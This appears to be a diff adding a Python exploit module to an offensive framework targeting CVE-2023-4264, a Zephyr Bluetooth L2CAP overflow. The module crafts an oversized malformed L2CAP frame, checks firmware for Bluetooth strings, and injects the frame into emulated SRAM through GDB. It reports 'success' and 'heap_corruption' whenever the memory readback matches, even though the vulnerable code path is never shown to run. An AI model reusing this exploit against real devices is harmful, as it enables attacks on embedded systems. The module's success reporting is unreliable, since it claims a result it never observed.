@@ -1,0 +1,184 @@
+"""Zephyr BLE CVE-2023-4264 L2CAP stack/heap overflow exploit module."""
+
+from __future__ import annotations
+
+import struct
+import logging
+
+from rtosploit.scanners.base import ScannerModule, ScanOption, ScanResult
+
+logger = logging.getLogger(__name__)
+
+# SRAM buffer address for payload injection via GDB
+_DEFAULT_INJECT_ADDR = 0x20002000
+
+
+class ZephyrBLECVE20234264(ScannerModule):
+    name = "ble_cve_2023_4264"
+    description = (
+        "Zephyr BLE CVE-2023-4264: Stack and heap buffer overflows in the Bluetooth "
+        "subsystem. Malformed Bluetooth Classic L2CAP packets trigger out-of-bounds "
+        "writes in the BT host stack, potentially leading to arbitrary code execution "
+        "or denial of service. Affects Zephyr < 3.5.0."
+    )
+    authors = ["RTOSploit Contributors"]
+    references = [
+        "CVE-2023-4264",
+        "https://nvd.nist.gov/vuln/detail/CVE-2023-4264",
+        "https://github.com/zephyrproject-rtos/zephyr/security/advisories",
+    ]
+    rtos = "zephyr"
+    rtos_versions = ["3.0.0", "3.1.0", "3.2.0", "3.3.0", "3.4.0"]
+    architecture = "armv7m"
+    category = "heap_corruption"
+    reliability = "medium"
+    cve = "CVE-2023-4264"
+
+    def register_options(self):
+        self.add_option(ScanOption(
+            name="l2cap_data_size", type="int", required=False, default=300,
+            description="Size of malformed L2CAP payload to trigger overflow"
+        ))
+        self.add_option(ScanOption(
+            name="target_device", type="str", required=False, default="hci0",
+            description="BLE/BT HCI device or QEMU BT interface"
+        ))
+
+    def _build_l2cap_packet(self, data_size: int) -> bytes:
+        """Construct a malformed L2CAP Basic frame that overflows bt_buf.
+
+        L2CAP Basic frame layout:
+            uint16_t length   -- SDU length (set to data_size to trigger overflow)
+            uint16_t cid      -- Channel ID (0x0040 = first dynamic channel)
+            uint8_t  data[]   -- payload filled with pattern bytes
+
+        The overflow occurs because `length` exceeds the allocated bt_buf size,
+        causing the BT host stack to write past the buffer boundary.
+        """
+        cid = 0x0040  # First dynamic L2CAP channel
+        # Fill with recognizable pattern: 0x41 ('A') for easy identification in memory
+        overflow_data = bytes([0x41 + (i % 26) for i in range(data_size)])
+        # Pack header: length field = data_size (exceeds allocation), CID = dynamic channel
+        header = struct.pack("<HH", data_size, cid)
+        return header + overflow_data
+
+    def check(self, target) -> bool:
+        if not target.fingerprint or target.fingerprint.rtos_type != "zephyr":
+            return False
+        data = target.firmware.data
+        # Look for Bluetooth Classic stack indicators
+        return b"bt_" in data or b"BT_" in data or b"l2cap" in data or b"L2CAP" in data
+
+    def exploit(self, target, payload) -> ScanResult:
+        data_size = self.get_option("l2cap_data_size")
+
+        # Step 1: Construct the actual malformed L2CAP packet
+        l2cap_packet = self._build_l2cap_packet(data_size)
+        packet_hex = l2cap_packet.hex()
+
+        notes = [
+            "CVE-2023-4264: L2CAP stack/heap overflow via oversized SDU",
+            f"Constructed malformed L2CAP Basic frame: {len(l2cap_packet)} bytes total",
+            f"L2CAP header: length={data_size} (0x{data_size:04x}), CID=0x0040 (dynamic channel)",
+            f"Overflow payload: {data_size} bytes of pattern data",
+            f"Crafted packet (hex): {packet_hex}",
+        ]
+
+        # Step 2: Check if we have a live GDB connection for injection
+        gdb = None
+        if target._qemu is not None:
+            gdb = getattr(target._qemu, "gdb", None)
+
+        if gdb is not None and getattr(gdb, "_connected", False):
+            # Inject payload into target memory via GDB
+            inject_addr = _DEFAULT_INJECT_ADDR
+            try:
+                gdb.write_memory(inject_addr, l2cap_packet)
+                notes.append(
+                    f"Payload injected into target SRAM at 0x{inject_addr:08x} via GDB"
+                )
+
+                # Read back to verify the write succeeded
+                readback = gdb.read_memory(inject_addr, len(l2cap_packet))
+                if readback == l2cap_packet:
+                    notes.append("Verification: payload readback matches crafted packet")
+                else:
+                    notes.append(
+                        "WARNING: payload readback does not match -- "
+                        "memory write may have been partially corrupted"
+                    )
+                    return ScanResult(
+                        module="zephyr/ble_cve_2023_4264",
+                        status="failure",
+                        target_rtos="zephyr",
+                        architecture="armv7m",
+                        technique="bt_stack_overflow",
+                        payload_delivered=False,
+                        payload_type="bt_packet",
+                        achieved=[],
+                        registers_at_payload={},
+                        notes=notes,
+                        cve="CVE-2023-4264",
+                    )
+
+                # Read registers for diagnostic context
+                try:
+                    regs = gdb.read_registers()
+                except Exception:
+                    regs = {}
+
+                return ScanResult(
+                    module="zephyr/ble_cve_2023_4264",
+                    status="success",
+                    target_rtos="zephyr",
+                    architecture="armv7m",
+                    technique="bt_stack_overflow",
+                    payload_delivered=True,
+                    payload_type="bt_packet",
+                    achieved=["heap_corruption"],
+                    registers_at_payload=regs,
+                    notes=notes,
+                    cve="CVE-2023-4264",
+                )
+
+            except Exception as exc:
+                notes.append(f"GDB injection failed: {exc}")
+                return ScanResult(
+                    module="zephyr/ble_cve_2023_4264",
+                    status="failure",
+                    target_rtos="zephyr",
+                    architecture="armv7m",
+                    technique="bt_stack_overflow",
+                    payload_delivered=False,
+                    payload_type="bt_packet",
+                    achieved=[],
+                    registers_at_payload={},
+                    notes=notes,
+                    cve="CVE-2023-4264",
+                )
+        else:
+            # No GDB target available -- be honest about it
+            notes.append(
+                "No active QEMU+GDB session available. "
+                "Payload constructed but cannot be delivered or verified. "
+                "Start QEMU with GDB stub to inject and test this exploit."
+            )
+            return ScanResult(
+                module="zephyr/ble_cve_2023_4264",
+                status="not_run",
+                target_rtos="zephyr",
+                architecture="armv7m",
+                technique="bt_stack_overflow",
+                payload_delivered=False,
+                payload_type="bt_packet",
+                achieved=[],
+                registers_at_payload={},
+                notes=notes,
+                cve="CVE-2023-4264",
+            )
+
+    def cleanup(self, target) -> None:
+        pass
+
+    def requirements(self) -> dict:
+        return {"qemu": True, "gdb": True, "network": True}
